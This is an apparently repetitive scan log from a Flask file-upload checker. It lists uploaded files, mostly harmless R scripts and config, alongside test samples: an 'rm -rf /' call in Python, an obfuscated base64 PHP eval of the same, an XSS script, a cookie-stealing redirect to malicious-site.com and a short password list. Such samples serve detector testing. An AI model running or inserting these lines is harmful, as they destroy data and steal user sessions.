# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,142 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,144 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,145 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,146 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,147 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,148 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,150 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,155 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,156 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,158 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,160 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,161 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,164 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,165 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,167 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,168 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,169 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,170 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,171 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,177 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,178 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,179 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,180 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,181 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,183 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,184 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,185 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,186 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,187 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,189 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,190 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,191 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,192 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,193 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,196 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,197 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,198 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,199 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,200 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,201 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,202 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,204 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,205 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:39:04,206 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,208 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:39:04,209 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:39:04,211 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,213 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,215 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,217 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,219 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,220 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,221 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,222 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,224 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,225 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,235 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,236 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,238 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,242 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,243 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,246 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,247 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,248 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,250 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,251 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,252 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,253 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,258 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,259 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,261 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,263 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,264 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,267 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,268 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,269 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,270 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,271 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,272 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:39:04,273 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:39:04,279 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:39:04,280 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,282 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:39:04,284 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:39:04,286 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:39:04,288 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:39:04,289 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:39:04,291 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:39:04,292 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:39:04,293 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:39:04,294 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

